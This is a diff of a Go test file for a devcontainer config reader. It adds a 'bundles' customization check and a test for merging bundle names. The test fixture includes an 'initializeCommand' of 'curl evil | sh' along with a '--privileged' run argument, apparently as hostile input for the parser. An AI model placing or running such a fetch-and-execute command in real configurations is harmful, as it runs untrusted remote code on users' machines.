@@ -159,7 +159,7 @@ func TestBoxDevcontainer(t *testing.T) {
   "initializeCommand": "curl evil | sh",
   "runArgs": ["--privileged"],
   /* block */
-  "customizations": {"hi": {"domains": ["data.example.com"], "network": "locked", "gpu": true}},
+  "customizations": {"hi": {"domains": ["data.example.com"], "network": "locked", "gpu": true, "bundles": ["data"]}},
 }`), 0o644)
 	config, err := readBoxDevcontainer(root)
 	if err != nil {
@@ -175,8 +175,17 @@ func TestBoxDevcontainer(t *testing.T) {
 		t.Fatalf("postCreate = %q", config.postCreate())
 	}
 	hi := config.Customizations.Hi
-	if hi.Network != "locked" || !hi.GPU || hi.Domains[0] != "data.example.com" {
+	if hi.Network != "locked" || !hi.GPU || hi.Domains[0] != "data.example.com" || strings.Join(hi.Bundles, ",") != "data" {
 		t.Fatalf("customizations = %+v", hi)
+	}
+}
+
+func TestMergeBundleNames(t *testing.T) {
+	if got := strings.Join(mergeBundleNames([]string{"data", " web"}, []string{"web", "office"}), ","); got != "data,web,office" {
+		t.Fatalf("merged %q", got)
+	}
+	if got := mergeBundleNames(nil, nil); len(got) != 0 {
+		t.Fatalf("nothing merged to %v", got)
 	}
 }
 
